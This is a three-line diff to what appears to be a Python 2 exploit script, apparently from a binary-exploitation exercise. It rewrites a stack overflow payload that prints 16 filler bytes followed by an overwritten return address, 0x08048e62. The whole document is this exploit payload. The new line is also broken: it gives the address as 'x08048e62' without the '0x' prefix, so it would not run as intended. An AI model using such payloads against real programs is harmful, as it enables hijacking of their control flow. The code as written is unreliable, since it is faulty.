@@ -1,1 +1,3 @@
-print "a"*16 + "\x62\x8e\x04\x08"
+from struct import pack
+
+print "a"*16 + pack("<I", x08048e62) 
